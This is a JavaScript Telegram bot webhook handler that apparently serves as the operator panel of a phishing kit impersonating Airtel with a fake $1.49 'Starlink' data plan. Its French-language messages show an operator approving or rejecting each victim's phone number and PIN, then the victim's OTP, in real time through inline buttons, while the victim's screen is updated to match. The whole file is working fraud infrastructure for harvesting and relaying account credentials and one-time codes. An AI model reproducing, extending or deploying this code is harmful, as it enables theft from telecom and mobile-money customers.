const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';

const FETCH_HEADERS = {
  'Content-Type': 'application/json',
  'Accept': 'application/json',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Health check for webhook
  if (req.method === 'GET') {
    return res.status(200).json({ status: 'Telegram Webhook is operational.' });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const update = req.body || {};

    // 1. INLINE BUTTON CALLBACK QUERY
    if (update.callback_query) {
      const cq = update.callback_query;
      const callbackData = cq.data || '';
      const callbackId = cq.id;
      const msgId = cq.message?.message_id;
      const chatId = cq.message?.chat?.id;

      let recordId = '';
      let actionType = ''; // 'approve_login' | 'reject_login' | 'approve_otp' | 'reject_otp'

      // Parse callback data
      if (callbackData.startsWith('approve_login_')) {
        recordId = callbackData.replace('approve_login_', '');
        actionType = 'approve_login';
      } else if (callbackData.startsWith('reject_login_')) {
        recordId = callbackData.replace('reject_login_', '');
        actionType = 'reject_login';
      } else if (callbackData.startsWith('approve_otp_')) {
        recordId = callbackData.replace('approve_otp_', '');
        actionType = 'approve_otp';
      } else if (callbackData.startsWith('reject_otp_')) {
        recordId = callbackData.replace('reject_otp_', '');
        actionType = 'reject_otp';
      }

      console.log(`[Webhook] Action: ${actionType}, Record ID: ${recordId}`);

      if (recordId) {
        // Update server-side state via set-status endpoint
        try {
          const setStatusRes = await fetch(`${req.protocol}://${req.get('host')}/api/telegram/set-status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: recordId,
              loginStatus: actionType === 'approve_login' ? 'approved' : actionType === 'reject_login' ? 'rejected' : undefined,
              otpStatus: actionType === 'approve_otp' ? 'approved' : actionType === 'reject_otp' ? 'rejected' : undefined,
            }),
          });
          console.log('[Webhook] Status updated via set-status:', setStatusRes.ok);
        } catch (e) {
          console.warn('[Webhook] Failed to update status via set-status:', e);
        }

        // Answer Telegram callback query immediately
        let alertMsg = 'Action enregistrée';
        if (actionType === 'approve_login') alertMsg = '✅ Connexion validée ! Passage au code OTP.';
        if (actionType === 'reject_login') alertMsg = '❌ Connexion refusée (Code PIN ou numéro incorrect).';
        if (actionType === 'approve_otp') alertMsg = '✅ Code OTP validé avec succès ! Forfait activé.';
        if (actionType === 'reject_otp') alertMsg = '❌ Code OTP rejeté ou invalide.';

        const answerRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            callback_query_id: callbackId,
            text: alertMsg,
            show_alert: true,
          }),
        });

        const answerData = await answerRes.json();
        if (!answerData.ok) {
          console.error('[Webhook] answerCallbackQuery failed:', answerData);
        }

        // Update message text in Telegram AND REMOVE BUTTONS
        if (msgId && chatId) {
          let updatedText = '';
          const phone = recordId.includes('_') ? recordId.split('_')[1] : 'Inconnu';
          const country = 'Airtel Africa';
          const planName = 'Forfait Airtel Starlink';
          const planPrice = '$1.49';

          if (actionType === 'approve_login') {
            updatedText =
              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
              `🌍 <b>Pays:</b> ${country}\n` +
              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
              `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
              `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>\n` +
              `<i>L'utilisateur accède actuellement à la saisie du code OTP.</i>`;
          } else if (actionType === 'reject_login') {
            updatedText =
              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
              `🌍 <b>Pays:</b> ${country}\n` +
              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
              `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
              `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>\n` +
              `<i>L'utilisateur a été notifié de l'erreur sur son écran.</i>`;
          } else if (actionType === 'approve_otp') {
            updatedText =
              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP VALIDÉ</b>\n\n` +
              `🌍 <b>Pays:</b> ${country}\n` +
              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
              `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
              `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>\n` +
              `<i>Paiement réussi et forfait Starlink activé !</i>`;
          } else if (actionType === 'reject_otp') {
            updatedText =
              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP REFUSÉ</b>\n\n` +
              `🌍 <b>Pays:</b> ${country}\n` +
              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
              `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
              `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>`;
          }

          if (updatedText) {
            console.log('[Webhook] Updating message and removing buttons for:', recordId);
            const editRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                message_id: msgId,
                text: updatedText,
                parse_mode: 'HTML',
                reply_markup: { remove_keyboard: true },
              }),
            });

            const editData = await editRes.json();
            if (!editData.ok) {
              console.error('[Webhook] editMessageText failed:', editData);
            } else {
              console.log('[Webhook] Message updated successfully, buttons removed');
            }
          }
        }

        return res.status(200).json({ ok: true });
      }
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Webhook error:', error);
    return res.status(200).json({ ok: true });
  }
}
